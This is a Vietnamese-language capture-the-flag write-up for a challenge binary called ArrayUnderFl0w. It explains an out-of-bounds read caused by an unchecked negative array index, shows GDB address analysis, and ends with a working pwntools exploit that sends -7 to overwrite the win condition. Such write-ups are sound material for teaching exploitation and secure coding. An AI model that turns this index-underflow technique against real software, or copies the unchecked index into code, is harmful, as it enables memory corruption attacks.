# 0x01 Vulnerability 

Ý tưởng chính của bài toán như sau
- Tạo số random với seed được lấy từ `/dev/urandom`. Ở đây, mình không khai thác được gì từ chi tiết này. 
- Chúng ta có một mảng 0x1000 phần tử và 10 lượt chơi game. Mỗi lượt chơi, mình phải đoán trúng `index` mà chương trình đã random. 
- Nếu đoán trúng, mình sẽ cộng thêm được 1 điểm và 1 lượt chơi nữa. 

Như chúng ta đã phân tích ở trên, bài toán này không thể khai thác ở random. Chúng ta quan sát kỹ hơn source code sẽ thấy có bug OOB ở đây. 

```c
scanf("%d", &inp)
.....
if (nums[inp] == 1) {
  printf("u are brilliant!\nChance++\n");
  rounds += 1;
  chances += 1;

  if (rounds >= MAXROUND)
    win();

} else {
  printf("Wrong!\n");
}
```

Do hàm `scanf()` không kiểm tra giá trị của `inp`, dẫn tới mình có thể nhập giá trị âm cho `inp`. Đồng nghĩa với việc mình sẽ có cơ hội "thao túng" chương trình. 


Mình sẽ thử nhập `inp = -1` để xem thử mảng `nums` sẽ trỏ đi tới đâu. Tiếp tục đặt breakpoint tại vị trí 
```sh
=> 0x0000555555555417 <+202>:   lea    rax,[rip+0x2c62]        # 0x555555558080 <nums>
   0x000055555555541e <+209>:   mov    eax,DWORD PTR [rdx+rax*1]
   0x0000555555555421 <+212>:   cmp    eax,0x1
```

chúng ta biết được địa chỉ mảng `nums` bằng 0x555555558080. 2 câu lệnh tiếp theo sẽ lấy giá trị của `nums[inp]` gán cho `$eax` rồi đem đi so sánh với 0x1.\
Chúng ta chỉ cần quan tâm tới `rdx+rax*1` vì đây chính là địa chỉ của `inp`. 

```sh
gef➤  x/x $rdx + $rax*1
0x55555555807c: 0x00000000
```

Từ đây, ta đã biết được địa chỉ `inp` bằng 0x55555555807c và từ chương trình debug, ta có địa chỉ biến `chances` bằng 0x555555558064. 

## 0x02 Plan

Như phân tích ở trên, chúng ta hoàn toàn "thao túng" được biến `chances`, nhưng nó sẽ giúp được cái gì? 

Nếu như ta đoán sai 8 lần, `chances` sẽ bằng 2. Vào game, `chances` bị trừ đi 1, lúc này, mình sẽ trỏ `inp` tới `chances` và sẽ thỏa mãn điều kiện 
```c
  chances -= 1;
  ......
  if (nums[inp] == 1) {
    printf("u are brilliant!\nChance++\n");
    rounds += 1;
    chances += 1;

    if (rounds >= MAXROUND)
      win();
  } else {
    printf("Wrong!\n");
  }
```
Từ đó, chúng ta có được `rounds = 0` và `chances = 2`. Bây giờ, ta chỉ cần spam `inp` tới `chances` thì sẽ có đáp án. 

Vậy phải nhập giá trị bao nhiêu để `inp` trỏ tới được `chances`. Nhận thấy, với `inp = -1`, con trỏ ngay tới trước mảng `nums`. Vậy giá trị thỏa mãn là $(0x555555558080 - 0x555555558064) / 4 = 7$

## 0x03 Exploit

```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./ArrayUnderFl0w', checksec = False)
p = process(elf.path)

p.recvline()
p.recvline()
p.sendline(b'-7')

for i in range(7):
  p.recvline()
  p.recvline()  
  p.recvline()  
  p.sendline(b'-7')

for i in range(10):
  p.recvline()
  p.recvline()  
  p.recvline()  
  p.sendline(b'-7')

p.interactive()
```